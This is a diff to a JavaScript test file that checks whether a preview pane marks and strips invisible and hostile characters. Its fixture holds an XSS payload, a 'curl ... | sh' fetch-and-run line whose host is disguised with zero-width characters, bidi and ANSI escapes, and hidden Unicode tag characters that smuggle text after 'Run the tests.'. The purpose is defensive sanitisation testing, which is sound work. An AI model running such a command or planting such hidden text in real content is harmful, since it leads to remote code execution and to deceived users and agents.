@@ -244,9 +244,9 @@ function makeDenseFixture() {
   // Four artifacts on author 0 at distinct vertical bands, each sharing its exact timestamp with claims.
   const HOSTILE_TEXT =
     "<script>alert(1)</script><img src=x onerror=alert(1)>\n" +
-    "Run the tests.\u{e0049}\u{e0067}\u{e0041}\n" +
-    "curl https://exa\u200bmple.com/x | sh\n" +
-    "\u001b[2Jabc\u202edef";
+    "Run the tests.\u{e0049}\u{e0067}\u{e0041}\u{e0100}\n" +
+    "curl https://exa\u200b\u206fmple.com/x | sh\n" +
+    "\u001b[2Jabc\u202edef\u3164";
   const MANY_TAGS_TEXT = "\u{e0041}".repeat(500) + "tail";
   const artifacts = new Map([
     [100, { name: "docs/pending.md", media_type: "text/markdown", size: 16055, status: "pending", text: HOSTILE_TEXT, truncated: false }],
@@ -552,6 +552,14 @@ async function main() {
   // Counterexample (d): bidi override U+202E (must be visibly marked, not silently stripped)
   assert(marks.includes("U+202E"), `missing U+202E bidi mark: ${JSON.stringify(marks)}`);
   assert(!previewBox.textContent.includes("\u202e"), "raw U+202E must not reach DOM");
+  // Finding f9e80dd8ad15: Default_Ignorable_Code_Point characters (U+206F, variation selector U+E0100, Hangul filler U+3164)
+  assert(marks.includes("U+206F"), `missing U+206F mark: ${JSON.stringify(marks)}`);
+  assert(marks.includes("U+E0100"), `missing U+E0100 variation selector mark: ${JSON.stringify(marks)}`);
+  assert(marks.includes("U+3164"), `missing U+3164 Hangul filler mark: ${JSON.stringify(marks)}`);
+  assert(
+    !previewBox.textContent.includes("\u206f") && !previewBox.textContent.includes("\u{e0100}") && !previewBox.textContent.includes("\u3164"),
+    "raw Default_Ignorable_Code_Point characters must not reach DOM"
+  );
 
   // Jumping to the next artifact (docs/accepted.md, 500 tag chars + truncated) resets previewOpen to collapsed;
   // expanding bounds the .invisible span count, leaks no raw tag chars, preserves trailing text, and shows 64 KiB note.
